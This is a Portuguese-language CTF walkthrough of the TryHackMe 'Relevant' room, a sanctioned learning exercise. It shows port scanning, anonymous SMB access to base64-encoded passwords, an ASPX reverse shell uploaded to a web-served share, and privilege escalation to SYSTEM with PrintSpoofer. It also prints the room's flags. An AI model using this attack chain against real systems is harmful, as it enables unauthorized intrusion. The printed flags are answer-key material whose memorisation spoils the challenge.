---
title: Writeup @ Relevant
published: 2026-02-02
description: 'Solving CTF "Relevant".'
image: ''
tags: [Hacking, Writeup]
category: Hacking
draft: false
lang: 'pt-br'
---

# Room Information

> Penetration Testing Challenge.

- TryHackMe - Relevant;
- https://tryhackme.com/room/relevant.

# Introduction

- Nessa sala temos um pequeno role-play, como descrito pelo autor:

```
You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

**Scope of Work**

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt


Additionally, the client has provided the following scope allowances:

- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first

- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)
```

- Vamos ver o que conseguimos.

# Information Gathering

## Port Scanning

- Vou ser honesto que aqui eu deixei de usar o cérebro e perdi muito tempo;
- Uma etapa crucial, e esqueci de escanear todas as portas com `-p-`;
- Até que cheguei longe, mas na parte de continuar enumerando, os serviços simplesmente não conectavam e não davam nenhuma informação muito útil (sério, eu perdi muito tempo);
- Portanto, fica como lição: **em CTF's, sempre que possível, escaneie TUDO**;

```
# Nmap 7.98 scan initiated Sat Jan  3 00:17:49 2026 as: /usr/lib/nmap/nmap -Pn -p- -oN nmap-out.txt 10.64.182.41
Nmap scan report for 10.64.182.41
Host is up (0.16s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown

# Nmap done at Sat Jan  3 00:25:23 2026 -- 1 IP address (1 host up) scanned in 454.59 seconds
```

- Podemos notar aqui alguns serviços interessantes, como:
	- `80`, serviço HTTP;
	- `135`, serviço RPC;
	- `139` / `445`, serviço SMB;
	- `3389`, serviço RDP;
	- E, por fim, 3 portas desconhecidas (vamos investigá-las).

## Web Directory Scanning

- Rodei o **gobuster** na porta 80, mas ele não conseguiu encontrar nada além de endereços com status _4xx_ e _5xx_, então, nem vamos perder muito tempo aqui;

```
# gobuster dir --url http://10.64.184.89/ --wordlist /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -o gobuster-out.txt
...
/*checkout*          (Status: 400) [Size: 3420]
/*docroot*           (Status: 400) [Size: 3420]
/*                   (Status: 400) [Size: 3420]
/devinmoore*         (Status: 400) [Size: 3420]
...
```

## Secret Ports

- Lembram das portas que encontramos? Então, acessando elas com o **netcat** (`nc 10.64.182.41 <port>`), notei que apenas a porta 49663 respondia, e pelo que podemos ver roda um servidor web nela, semelhante ao que temos na porta 80:

```
# nc 10.64.182.41 49663
A

HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Sat, 03 Jan 2026 00:29:39 GMT
Connection: close
Content-Length: 326

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Bad Request</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Bad Request - Invalid Verb</h2>
<hr><p>HTTP Error 400. The request verb is invalid.</p>
</BODY></HTML>
^C
```

# Enumeration

## General Enumeration

- Reiniciando a máquina algumas vezes, consegui me conectar ao serviço RPC (mas o RDP continuava OFF);
- Nele não consegui muita coisa, então nem vou perder tempo falando o que consegui (nada muito além de informações que com a shell que pegamos mais a frente não nos mostra).

## Samba Enumeration

- Aqui de cara teste a ferramenta **enum4linux** (aliás, uma das melhores ferramentas para isso), porém, estava dando um problema estranho, ele simplesmente não conectava corretamente;
- Então, vamos para o manual, com o **smbclient**, mas, com que login? Vamos tentar logar como **Anonymous**;
- Notei também que **NULL Session** (**-N**) também estão permitidas;

```
# smbclient -L //10.64.182.41 -U Anonymous
Password for [WORKGROUP\Anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.64.182.41 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

# smbclient //10.64.184.89/nt4wrksv -U Anonymous
Password for [WORKGROUP\Anonymous]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 21:46:04 2020
  ..                                  D        0  Sat Jul 25 21:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020

                7735807 blocks of size 4096. 5099855 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

# cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

- Onde encontramos credenciais encodadas aparentemente em **base64**, e decodando:

```
# for pass in $(cat passwords.txt); do echo $pass | base64 -d; done
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

- E usando esse path do share na porta estranha que tínhamos encontrado:

```
# nc 10.64.182.41 49663
GET /nt4wrksv/passwords.txt HTTP/1.1
Host: 10.64.182.41

HTTP/1.1 200 OK
Content-Type: text/plain
Last-Modified: Sat, 25 Jul 2020 15:15:33 GMT
Accept-Ranges: bytes
ETag: "65e151719662d61:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sat, 03 Jan 2026 00:47:52 GMT
Content-Length: 98

[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

- Podemos fazer uploads e acessar via web, **encontramos um vetor de entrada!**

# Exploitation

- Pronto, encontramos um possível ponto de entrada, isso porque, se conseguimos acessar `password.txt`, significa que é o mesmo share do SMB que tínhamos descoberto;
- Com isso, se tivermos como **Anonymous**, permissão de inserção de arquivos no servidor, podemos garantir um **RCE**.

```
# wget https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx

# smbclient //10.64.182.41/nt4wrksv -U Anonymous
Password for [WORKGROUP\Anonymous]:
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (23.0 kB/s) (average 11.8 kB/s)
```

- Acessando `http://10.64.182.41:49663/nt4wrksv/shell.aspx` e abrindo a porta que setamos ao editar o arquivo da shell, **spawnamos** uma:

```
# nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.64.182.41 49946
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
c:\windows\system32\inetsrv>
```

# Privilege Escalation

- Usarei como intermediador de arquivos entre minha máquina e servidor o servidor samba que descobrimos;
- Não sou acostumado a fazer escalação de privilégios em sistemas Windows, e minha noção é mínima, então aqui eu investi a maior parte do CTF;
- Comecei upando o **winPEAS** para enumerar possíveis vetores de ataque, mas por incrível que pareça ele não me disse nada a não sobre as pastas dentro de `C:\Users`;
- Indo até lá, encontramos a pasta `Public`, o usuário `Bob` e por fim o `Administrator`;
- Entrando na pasta do _Bob_ e listando o conteúdo, encontramos `user.txt`;

```
c:\>cd c:\Users\Bob\Desktop
cd c:\Users\Bob\Desktop

c:\Users\Bob\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob\Desktop

07/25/2020  01:04 PM    <DIR>          .
07/25/2020  01:04 PM    <DIR>          ..
07/25/2020  07:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,885,774,336 bytes free

c:\Users\Bob\Desktop>more user.txt
more user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

- Mas queremos mais, queremos `NT AUTORITHY\SYSTEM`;
- Como eu disse, não tenho experiência nesses cenários, então investi tempo em pesquisa e write-ups de outras máquinas pra me contextualizar;
- Uma falha comum existe quando um usuário tem permissões demais, e podemos verificar isso com:

```
c:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State                ============================= ========================================= ========             SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled             SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled             SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled              SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- Aqui temos uma permissão interessante e que não devíamos ter, a `SeImpersonatePrivilege`;
- Pesquisando sobre esse privilégio e sobre a versão do nosso windows (2016), encontrei uma PoC que explora exatamente essas circunstâncias, a **PrintSpoofer**, então, vamos upar no servidor:

```
# wget https://github.com/dievus/printspoofer/raw/refs/heads/master/PrintSpoofer.exe

# smbclient //10.66.159.221/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe
putting file PrintSpoofer.exe as \PrintSpoofer.exe (35.6 kB/s) (average 21.7 kB/s)
smb: \>
```

- Agora, vamos explorar:

```
c:\>cd ..\..\..\inetpub\wwwroot\nt4wrksv
cd ..\..\..\inetpub\wwwroot\nt4wrksv

c:\inetpub\wwwroot\nt4wrksv>dir
dir
Volume in drive C has no label.
Volume Serial Number is AC3C-5CB5
Directory of c:\inetpub\wwwroot\nt4wrksv                                                     01/03/2026  07:07 AM    <DIR>          .                                                     01/03/2026  07:07 AM    <DIR>          ..                                                    07/25/2020  07:15 AM                98 passwords.txt                                         01/03/2026  07:07 AM            27,136 PrintSpoofer.exe                                      01/03/2026  07:03 AM            15,974 shell.aspx                                                           3 File(s)         43,208 bytes                                                               2 Dir(s)  20,107,673,600 bytes free

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

# Post Exploitation

- Vamos ver se achamos a última flag no diretório administrador:

```
c:\Users\Administrator>cd c:\Users\Administrator\Desktop
cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Administrator\Desktop

07/25/2020  07:24 AM    <DIR>          .
07/25/2020  07:24 AM    <DIR>          ..
07/25/2020  07:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,048,031,744 bytes free
```

- Agora, vamos capturar e finalizar a sala:

```
c:\Users\Administrator\Desktop>more root.txt
more root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```
